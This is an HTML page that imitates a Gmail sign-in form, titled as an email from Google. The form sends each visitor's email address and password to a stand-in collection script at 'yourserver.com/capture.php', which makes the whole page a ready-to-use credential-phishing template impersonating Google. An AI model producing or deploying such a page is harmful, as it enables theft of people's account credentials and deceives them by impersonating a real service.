<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail - Email from Google</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .container { width: 300px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; }
        .input-field { margin-bottom: 10px; }
        .input-field input { width: 100%; padding: 8px; box-sizing: border-box; }
        .submit-btn { width: 100%; padding: 10px; background-color: #4285F4; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Gmail</h2>
        <form action="https://yourserver.com/capture.php" method="post">
            <div class="input-field">
                <input type="email" name="email" placeholder="Email" required>
            </div>
            <div class="input-field">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="submit-btn">Sign in</button>
        </form>
    </div>
</body>
</html>
